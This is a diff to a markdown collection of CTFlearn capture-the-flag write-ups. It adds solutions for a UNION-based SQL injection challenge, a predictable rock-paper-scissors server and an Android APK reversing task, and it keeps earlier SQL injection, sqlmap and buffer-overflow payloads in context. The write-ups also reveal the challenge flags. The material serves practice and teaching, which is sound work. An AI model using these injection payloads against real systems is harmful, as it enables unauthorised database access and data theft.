@@ -39,19 +39,22 @@
 	* [Morse Code](#morse-code)
 	* [HyperStream Test #2](#hyperstream-test-2)
 * [Web](#web)
-	* [Basic Injection](#basic-injection)
-	* [POST Practice](#post-practice)
-	* [Prehashbrown](#prehashbrown)
+		* [Basic Injection](#basic-injection)
+		* [POST Practice](#post-practice)
+		* [Prehashbrown](#prehashbrown)
 * [2. `sqlmap -u url  --data="name=value"`](#2-sqlmap--u-url----datanamevalue)
-	* [Don't Bump Your Head(er)](#dont-bump-your-header)
-	* [Inj3ction Time](#inj3ction-time)
+		* [Don't Bump Your Head(er)](#dont-bump-your-header)
+		* [Inj3ction Time](#inj3ction-time)
 * [Binary](#binary)
-	* [Lazy Game Challenge](#lazy-game-challenge)
-	* [Favorite Color](#favorite-color)
+		* [Lazy Game Challenge](#lazy-game-challenge)
+		* [Favorite Color](#favorite-color)
 * [Misc](#misc)
-	* [Help Bity](#help-bity)
+		* [Help Bity](#help-bity)
+		* [Rock Paper Scissors](#rock-paper-scissors)
 * [Programming](#programming)
 		* [Simple Programming](#simple-programming)
+* [Reverse](#reverse)
+		* [Basic Android RE 1](#basic-android-re-1)
 
 <!-- vim-markdown-toc -->
 
@@ -557,7 +560,7 @@ As the hint goes, Bacon's chiper.
 
 ## Web
 
-### Basic Injection
+#### Basic Injection
 *easy*
 
 Discription:
@@ -570,8 +573,10 @@ So let's try `Luke`. And we find that we need to inject.
 So an easy payload is `Luke' or '1'='1`
 And you can find the flag.
 
-### POST Practice
-*medium* (actually it's *easy*)
+#### POST Practice
+
+*medium* 
+(actually it's *easy*)
 
 Click the link and we can see the hint, which means we have to submit POST data.
 Check the source you can see `<!-- username: admin | password: 71urlkufpsdnlkadsf -->`
@@ -599,7 +604,7 @@ Content-Length: 32
 <h1>flag{p0st_d4t4_4ll_d4y}</h1>
 ```
 
-### Prehashbrown
+#### Prehashbrown
 
 *medium*
 
@@ -639,7 +644,7 @@ sqlmap -r 1.txt -D prehashbrown -T hashbrown --column  --batch --dump
 ```
 And you can find the flag.
 
-### Don't Bump Your Head(er)
+#### Don't Bump Your Head(er)
 *hard* (actually it's medium)
 
 Discription:Try to bypass my security measure on this site! http://165.227.106.113/header.php
@@ -692,15 +697,39 @@ Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
 <!-- Sup3rS3cr3tAg3nt  -->
 ```
 
-### Inj3ction Time
+#### Inj3ction Time
 
 *Hard*
 
 Discription:I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command
 
+First, just input 1, we can see the name, breed and color. So at least there are 4 cols, id, name, breed and color.
+we can use `order by` and we make sure there are 4 cols.
+
+`id=-1 union select 1,2,3,4`
+
+We can see
+
+```
+Name: 2
+Breed: 1
+Color: 3
+```
+
+So we can use 1,2,3 to show information we want.(4 is id)
+
+`id=-1 union select table_name,2,3,4 from information_schema.tables`
+We can see a table called `w0w_y0u_f0und_m3`.
+
+`id=-1 union select table_name,column_name,3,4 from information_schema.columns`
+We can see the name of the column in `w0w_y0u_f0und_m3` is `f0und_m3`.
+
+`id=-1 union select f0und_m3,2,3,4 from w0w_y0u_f0und_m3`
+Then we can see the flag.
+
 ## Binary
 
-### Lazy Game Challenge
+#### Lazy Game Challenge
 
 *easy*
 
@@ -711,7 +740,7 @@ To get flag, pwn the server at `nc thekidofarcrania.com 10001`
 
 The key point is that it's hard to win, so when you place a bet, input a negative number (for example: -1000000000) and then you can loose the game as you like it. Each time you loose a game, you gain some money. And when the game ends, you will get the flag.
 
-### Favorite Color
+#### Favorite Color
 
 *Medium*
 
@@ -819,7 +848,7 @@ So the payload can be `52A + \x57\x86\x04\x08`.
 
 ## Misc
 
-### Help Bity
+#### Help Bity
 
 *Middle*
 
@@ -838,8 +867,61 @@ BUGMd`sozc0o`sx^0r^`vdr1ld|
 
 Using this, finally I got the right flag.
 
+#### Rock Paper Scissors
+
+*Medium*
+
+Description: Do you think you're lucky enough to win 10 games of Rock Paper Scissors in a row? Connect to the server and find out. nc 138.197.193.132 5001
+
+First let's try it using whatever we want.
+
+```
+----------- Let's play rock, paper, scissors!
+----------- Beat me 10 times in a row to win the flag!
+
+Please choose: R / P / S
+>>>R
+You didn't win!
+I chose R based on 2454155475
+Please choose: R / P / S
+>>>R
+You won! Consecutive wins: 1
+I chose S based on 139951793
+Please choose: R / P / S
+```
+
+Know we know the program chooses the choice of R/P/S by numbers.
+Run it again we can find the numbers are the same. So the choices are the same.
+So we can first choose something for 10 times and record the program's choices. Thus we can win 10 times and get the flag.
+
 ## Programming
 
 #### Simple Programming
 
 Look at simple_programming.py
+
+## Reverse
+
+#### Basic Android RE 1
+
+*easy*
+
+Description: A simple APK, reverse engineer the logic, recreate the flag, and submit!
+
+`apktool d BasicAndroidRE1.apk`to decode the assets and disassemble the .dex file in the apk.
+We can `cat AndroidManifest.xml` and see a class called `com.example.secondapp.MainActivity`
+`smali/` contains a set of smali files, or bytecode representation of the application’s dex file. You can think of it as an intermediate file between the .java and the executable.
+
+So `cd /smali/com/example/secondapp` and we can see `MainActivity.smali`.
+In this file we can see 
+
+```
+const-string v1, "b74dec4f39d35b6a2e6c48e637c8aedb"
+const-string v2, "Success! CTFlearn{"
+const-string p1, "_is_not_secure!}"
+```
+v1 looks like md5 but we can find no result tring to dencrypt it.
+
+Use https://md5.gromweb.com/ (MD5 conversion and reverse lookup) to try again, we get `Spring2019`
+
+So the flag is `CTFlearn{Spring2019_is_not_secure!}`
